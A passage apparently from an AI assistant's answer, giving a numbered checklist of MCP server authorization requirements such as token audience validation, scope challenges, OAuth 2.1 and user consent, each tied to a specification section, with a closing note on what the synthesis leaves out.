1. Implement authorization only for HTTP transports; for STDIO, retrieve credentials from the environment. (Authorization, Protocol Requirements)
2. Publish an RFC 9728 Protected Resource Metadata document with a non-empty `authorization_servers` field; serve it via `WWW-Authenticate` `resource_metadata` and/or the well-known URIs. (Authorization Server Location; Protected Resource Metadata Discovery Requirements)
3. Validate every access token, enforcing that it was issued specifically for this server as audience; reject otherwise with HTTP 401. (Token Handling; Access Token Privilege Restriction)
4. Never accept or transit tokens not issued for this server; never pass the client's token to an upstream API. (Token Handling; Access Token Privilege Restriction)
5. Emit `scope` in `WWW-Authenticate` challenges and use 403 with `insufficient_scope` plus `resource_metadata` for runtime scope failures. (Scope Selection Strategy; Runtime Insufficient Scope Errors)
6. Account for scope hierarchies when judging token sufficiency; keep single-operation challenges complete to reduce round-trips. (Step-Up Authorization Flow)
7. If you are an authorization server: implement OAuth 2.1, support CIMD (SHOULD), treat DCR as deprecated/optional, provide RFC 8414 or OIDC discovery, advertise `authorization_response_iss_parameter_supported`, and serve all endpoints over HTTPS. (Authorization Overview; Client Registration; Authorization Response Validation; Communication Security)
8. Do not include `offline_access` in resource-facing `scopes_supported`. (Refresh Tokens)
9. For local/one-click installs, require explicit, untruncated consent before executing commands. (Local MCP Server Compromise; SEP-1024)
10. For proxying to third-party APIs with a static client ID, implement per-client consent before forwarding. (Confused Deputy Problem; Authorization Security Considerations)

**AI INFERENCE:** This checklist is a synthesis of the quoted clauses above; it introduces no requirement absent from a retrieved source, but it omits client-only obligations (e.g., PKCE, `resource` parameter, SSRF defenses) that are not server responsibilities.
